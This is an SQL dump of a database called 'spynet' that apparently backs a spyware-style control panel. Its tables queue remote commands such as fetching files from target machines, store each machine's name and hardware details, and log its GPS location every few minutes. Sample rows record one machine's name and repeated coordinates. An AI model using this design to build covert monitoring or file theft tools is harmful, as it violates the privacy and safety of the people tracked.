-- phpMyAdmin SQL Dump
-- version 4.2.11
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Sep 11, 2015 at 06:05 AM
-- Server version: 5.6.21
-- PHP Version: 5.6.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `spynet`
--

-- --------------------------------------------------------

--
-- Table structure for table `lenh`
--

CREATE TABLE IF NOT EXISTS `lenh` (
`id` int(11) NOT NULL,
  `user` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `cpuid` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `type` text NOT NULL,
  `code` mediumtext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `result` text NOT NULL,
  `loop` bit(1) NOT NULL DEFAULT b'0',
  `timecreated` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `timeexcute` datetime DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `lenh`
--

INSERT INTO `lenh` (`id`, `user`, `cpuid`, `type`, `code`, `result`, `loop`, `timecreated`, `timeexcute`) VALUES
(1, 'willx', 'BFEBFBFF000306A9', 'getfile', 'E:\\Tiny\\Games\\wsock32.zip', 'fc3689683498393410a801b98b6c8580-wsock32.zip', b'0', '2015-08-07 11:41:28', '2015-08-09 22:22:15');

-- --------------------------------------------------------

--
-- Table structure for table `pcinfo`
--

CREATE TABLE IF NOT EXISTS `pcinfo` (
  `user` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `cpuid` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `pcname` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `more` mediumtext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `filelist` longtext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `timeget` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pcinfo`
--

INSERT INTO `pcinfo` (`user`, `cpuid`, `pcname`, `more`, `filelist`, `timeget`) VALUES
('willx', 'BFEBFBFF000306A9', 'TUANANH-PC', 'OS: Microsoft Windows 10 Pro\r\nManufacturer: Acer\r\nModel: Aspire V5-471G', '0', '2015-08-09 22:28:28');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `user` varchar(255) NOT NULL,
  `password` text NOT NULL,
  `email` text NOT NULL,
  `sdt` text NOT NULL,
  `fullname` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `ngaydangky` datetime NOT NULL,
  `ngayhethan` date NOT NULL,
  `lock` bit(2) NOT NULL,
  `lydo` mediumtext CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `vitri`
--

CREATE TABLE IF NOT EXISTS `vitri` (
  `user` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `cpuid` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `latitude` text NOT NULL,
  `longitude` text NOT NULL,
  `timeget` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `vitri`
--

INSERT INTO `vitri` (`user`, `cpuid`, `latitude`, `longitude`, `timeget`) VALUES
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-07 11:25:58'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-07 11:27:58'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-07 11:29:58'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:44:11'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:46:11'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:48:11'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:54:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:56:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 20:58:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:00:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:02:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:07:56'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:09:56'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:16:00'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:33:35'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 21:39:23'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-08 23:51:57'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 14:48:50'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 14:50:50'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 15:19:42'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 15:24:51'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 15:28:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 15:30:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 15:32:54'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 19:57:49'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 22:20:36'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 22:22:36'),
('willx', 'BFEBFBFF000306A9', '10.7754', '106.6828', '2015-08-09 22:24:36');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `lenh`
--
ALTER TABLE `lenh`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pcinfo`
--
ALTER TABLE `pcinfo`
 ADD PRIMARY KEY (`user`,`cpuid`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
 ADD PRIMARY KEY (`user`);

--
-- Indexes for table `vitri`
--
ALTER TABLE `vitri`
 ADD PRIMARY KEY (`user`,`cpuid`,`timeget`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `lenh`
--
ALTER TABLE `lenh`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
